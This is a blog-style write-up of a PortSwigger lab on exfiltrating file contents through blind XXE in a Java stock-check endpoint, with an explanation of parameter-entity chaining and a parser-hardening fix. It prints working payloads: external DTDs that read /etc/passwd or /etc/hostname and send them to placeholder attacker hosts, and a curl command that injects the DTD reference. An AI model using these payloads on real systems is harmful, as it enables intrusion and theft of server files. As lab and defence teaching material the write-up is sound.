---
layout: post
title: "Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD"
date: 2027-08-16 09:00:00 -0500
categories: [PortSwigger, XXE]
tags: [xxe, blind, oob, exfiltration, external-dtd, parameter-entities, cwe-611, java, xml, oastify]
---

## Overview

This lab demonstrates **blind XXE data exfiltration via a malicious external DTD** — the technique that goes beyond confirming an OOB interaction to actually reading and exfiltrating file contents. The previous labs confirmed blind XXE via DNS; this one delivers the data.

**CWE:** [CWE-611](https://cwe.mitre.org/data/definitions/611.html) — Improper Restriction of XML External Entity Reference  
**Difficulty:** Practitioner

---

## The Vulnerability

The `/product/stock` endpoint accepts XML and passes it to a Java `DocumentBuilder`. Java's parser resolves [external entity references](https://cwe.mitre.org/data/definitions/611.html) by default — no configuration flag is required for the vulnerability to be present. This is the opposite of PHP, which requires the explicit `LIBXML_NOENT` flag.

This lab is **blind**: the resolved entity value is never echoed back in any HTTP response. The only observable side-channel is network activity — an outbound HTTP request the server makes to an attacker-controlled host.

---

## Why the External DTD Chain is Required

The core constraint of standard blind XXE is that **inline DTD subsets cannot chain parameter entities**. The XML specification forbids a parameter entity from referencing another parameter entity defined in the same internal subset. This rule prevents the three-entity exfiltration chain from working when embedded directly in the `DOCTYPE`:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker/?x=%file;'>">
  %exfil;
  %send;
]>
```

This **fails** inline. The parser rejects the `%file;` reference inside `%exfil`'s value when both are declared in the same internal subset.

**External DTDs lift this restriction.** When the DTD is fetched from a remote URL, the XML parser processes it under the external DTD ruleset, where parameter entities may freely reference other parameter entities.

---

## The Exfiltration Chain

Host the following as `malicious.dtd` on an attacker-controlled server:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<attacker>/?x=%file;'>">
%eval;
%exfil;
```

| Step | What happens |
|------|-------------|
| `%file` declared | Entity `%file` will resolve to the contents of `/etc/hostname` via a `file://` SYSTEM URI |
| `%eval` declared | A string literal whose value, when evaluated, dynamically defines `%exfil` — with `%file` interpolated into the SYSTEM URL. `&#x25;` encodes `%` (raw `%` is illegal inside a DTD parameter literal value) |
| `%eval;` referenced | Parser evaluates `%eval`, which creates the `%exfil` entity with the file contents substituted into the URL |
| `%exfil;` referenced | Parser fetches `http://<attacker>/?x=<hostname>` — file contents appear in the query string |

---

## Solution

**Step 1 — host `malicious.dtd`** on an exploit server or local HTTP server. On a PortSwigger lab, this is the provided exploit server; in a real engagement, use `python3 -m http.server`.

DTD content:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://<exploit-server>/?x=%file;'>">
%eval;
%exfil;
```

**Step 2 — inject the external DTD reference** at the stock-check endpoint:

```bash
curl -s https://TARGET.web-security-academy.net/product/stock \
  -H 'Content-Type: application/xml' \
  --data '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://<exploit-server>/malicious.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
```

**Expected response:** `HTTP 400 "XML parsing error"` — this is correct. The exfiltration already fired before the parse error was returned.

**Step 3 — read the exploit server access log:**

```
10.0.4.175  "GET /malicious.dtd HTTP/1.1" 200 "User-Agent: Java/21.0.1"
10.0.4.175  "GET /?x=8b1f64ef71a5 HTTP/1.1" 200 "User-Agent: Java/21.0.1"
```

The `?x=` parameter contains the contents of `/etc/hostname`. The `User-Agent: Java/21.0.1` confirms Java's parser resolved the external entities without any opt-in flag.

**Step 4 — submit the hostname** as the solution → lab solved.

---

## Contrast: OOB Trigger vs. Data Exfiltration

| Variant | Injection | Can read file contents? |
|---------|-----------|------------------------|
| Direct entity OOB | `<!ENTITY xxe SYSTEM "http://oast">` + `&xxe;` | No — confirms XXE, no data |
| Parameter entity OOB | `<!ENTITY % xxe SYSTEM "http://oast"> %xxe;` | No — confirms blind XXE, no data |
| **External DTD chain** | `%xxe;` loads malicious.dtd; chain reads file into OOB URL | **Yes — file contents in `?x=`** |

The first two variants confirm that [improper restriction of XML external entity references](https://cwe.mitre.org/data/definitions/611.html) is present. The external DTD chain is required to actually extract data when there is no in-band reflection channel.

---

## The Fix

Disable all external entity and DTD processing at the parser level:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

Filtering `SYSTEM`, `ENTITY`, or `%` in the request body is insufficient — encoding variants (`&#x25;`, whitespace, alternate DTD syntax) bypass text-level filters. The only reliable mitigation is disabling DTD processing at the parser API level before any XML is consumed.

---

*Solved — PortSwigger Web Security Academy*
